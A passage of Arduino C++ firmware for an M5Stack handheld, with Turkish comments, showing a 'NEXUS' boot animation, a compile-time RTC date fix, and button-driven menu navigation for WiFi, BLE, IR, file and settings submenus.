}

// ====================== BOOT SCREEN ======================
void bootScreen() {
  M5.Lcd.fillScreen(BLACK);

  // --- Logo animasyonu ---
  const char* lines[] = {
    "  _  _ ___ _  _ _   _ ___ ",
    " | \\| | __| \\/ | | | / __|",
    " | .` | _| >  < | |_| \\__ \\",
    " |_|\\_|___/_/\\_|\\___/|___/"
  };
  // Satırları yukarıdan aşağı yaz, her biri gecikmeyle
  M5.Lcd.setTextSize(1);
  for (int i = 0; i < 4; i++) {
    M5.Lcd.setTextColor(i < 2 ? GREEN : 0x07E0); // ilk 2 bright green, son 2 dim
    M5.Lcd.setCursor(2, 10 + i * 10);
    M5.Lcd.print(lines[i]);
    delay(120);
  }

  delay(200);
  bootMelody();
  delay(100);

  // --- Sistem kontrol satırları ---
  struct { const char* label; uint16_t color; int ms; } checks[] = {
    { "> WiFi module    [OK]", GREEN,  250 },
    { "> BLE module     [OK]", GREEN,  250 },
    { "> IR module      [OK]", GREEN,  250 },
    { "> LittleFS       [OK]", GREEN,  250 },
    { "> System ready      ", CYAN,   400 },
  };

  M5.Lcd.setTextSize(1);
  for (int i = 0; i < 5; i++) {
    M5.Lcd.setTextColor(0x3186); // önce gri yaz
    M5.Lcd.setCursor(4, 56 + i * 12);
    M5.Lcd.print(checks[i].label);
    delay(checks[i].ms / 2);
    // sonra renkli yaz
    M5.Lcd.setTextColor(checks[i].color);
    M5.Lcd.setCursor(4, 56 + i * 12);
    M5.Lcd.print(checks[i].label);
    delay(checks[i].ms / 2);
  }

  // Son bip
  if (soundEnabled) beep(1568, 60);
  delay(500);
}

void comingSoon(){
  if (screenOff) return;
  M5.Lcd.fillScreen(BLACK);
  drawStatusBar();
  M5.Lcd.fillRect(0, 22, 240, 220, BLACK);
  M5.Lcd.setTextColor(YELLOW);
  M5.Lcd.setTextSize(2);

  // ---- TITLE + "coming soon" dikey ortalandı ----
  // Ekran 135px, status bar 22px → içerik 113px → merkez y=78
  // textSize(2) → satır yüksekliği ~16px, iki satır toplam ~38px
  // İlk satır: 78 - 19 = 59, ikinci satır: 78 + 3 = 81
  String title = menuItems[menuIndex];
  int titleX = (240 - M5.Lcd.textWidth(title)) / 2;
  M5.Lcd.setCursor(titleX, 59);
  M5.Lcd.print(title);

  String csText = "coming soon";
  int csX = (240 - M5.Lcd.textWidth(csText)) / 2;
  M5.Lcd.setCursor(csX, 81);
  M5.Lcd.print(csText);
  // -------------------------------------------------

  delay(1400);
  drawMenu();
}

void setup() {
  M5.begin();
  M5.Lcd.setRotation(3);

  // ---- RTC 2000 FIX: compile zamanı tarihi yaz ----
  m5::rtc_date_t nowDate;
  M5.Rtc.getDate(&nowDate);
  if (nowDate.year <= 2000) {
    // __DATE__ = "Mar 12 2026" gibi
    const char* compDate = __DATE__; // "Mmm DD YYYY"
    const char* compTime = __TIME__; // "HH:MM:SS"
    const char* months = "JanFebMarAprMayJunJulAugSepOctNovDec";
    char mon[4] = {compDate[0], compDate[1], compDate[2], 0};
    int month = (strstr(months, mon) - months) / 3 + 1;
    int day   = atoi(compDate + 4);
    int year  = atoi(compDate + 7);
    int hour  = atoi(compTime);
    int min_  = atoi(compTime + 3);
    int sec_  = atoi(compTime + 6);
    m5::rtc_date_t d; d.year = year; d.month = month; d.date = day;
    m5::rtc_time_t t; t.hours = hour; t.minutes = min_; t.seconds = sec_;
    M5.Rtc.setDate(&d);
    M5.Rtc.setTime(&t);
  }
  // -------------------------------------------------

  lastActivity = millis();
  pinMode(IR_PIN, OUTPUT);   digitalWrite(IR_PIN, LOW);
  pinMode(BUZZ_PIN, OUTPUT); digitalWrite(BUZZ_PIN, LOW);
  LittleFS.begin(true);
  bootScreen();
  drawMenu();
}

void loop() {
  M5.update();

  if (!screenOff && (millis() - lastActivity > sleepTimeout)) {
    screenOff = true;
    M5.Lcd.setBrightness(0);
  }

  // ---- WAKE: sadece uyandır, o turdaki aksiyonu yuttur ----
  if (screenOff) {
    if (M5.BtnA.wasPressed() || M5.BtnB.wasPressed() || M5.BtnPWR.wasPressed()) {
      wakeIfNeeded();
    }
    return;
  }
  // ---------------------------------------------------------

  // ---- BtnPWR uzun bas = submenüden ana menüye çık ----
  if (inSubMenu && M5.BtnPWR.wasHold()) {
    inSubMenu = false;
    subMenuIndex = 0;
    drawMenu();
    lastActivity = millis();
    return;
  }
  // -----------------------------------------------------

  if (M5.BtnB.wasPressed()) {
    lastActivity = millis();
    if (inSubMenu) {
      subMenuIndex++;
      if (activeSub == 0 && subMenuIndex > 6) subMenuIndex = 0;
      if (activeSub == 1 && subMenuIndex > 3) subMenuIndex = 0;
      if (activeSub == 2 && subMenuIndex > 5) subMenuIndex = 0;
      if (activeSub == 3 && subMenuIndex > 3) subMenuIndex = 0;
      if (activeSub == 4 && subMenuIndex > 4) subMenuIndex = 0;
      if (activeSub == 5 && subMenuIndex > 2) subMenuIndex = 0;
      drawSubMenu();
    } else {
      menuIndex++;
      if (menuIndex > 5) menuIndex = 0;
      drawMenu();
    }
  }

  if (M5.BtnPWR.wasPressed()) {
    lastActivity = millis();
    if (inSubMenu) {
      subMenuIndex--;
      if (subMenuIndex < 0) {
        if (activeSub == 0) subMenuIndex = 6;
        if (activeSub == 1) subMenuIndex = 3;
        if (activeSub == 2) subMenuIndex = 5;
        if (activeSub == 3) subMenuIndex = 3;
        if (activeSub == 4) subMenuIndex = 4;
        if (activeSub == 5) subMenuIndex = 2;
      }
      drawSubMenu();
    } else {
      menuIndex--;
      if (menuIndex < 0) menuIndex = 5;
      drawMenu();
    }
  }

  if (M5.BtnA.wasPressed()) {
    lastActivity = millis();
    if (inSubMenu) {
      executeSubAction();
    } else {
      if (menuIndex == 0) wifiSubMenu();
      else if (menuIndex == 1) bleSubMenu();
      else if (menuIndex == 2) irSubMenu();
      else if (menuIndex == 3) filesSubMenu();
      else if (menuIndex == 4) clockScreen();
      else if (menuIndex == 5) settingsSubMenu();
      else comingSoon();
    }
  }
}
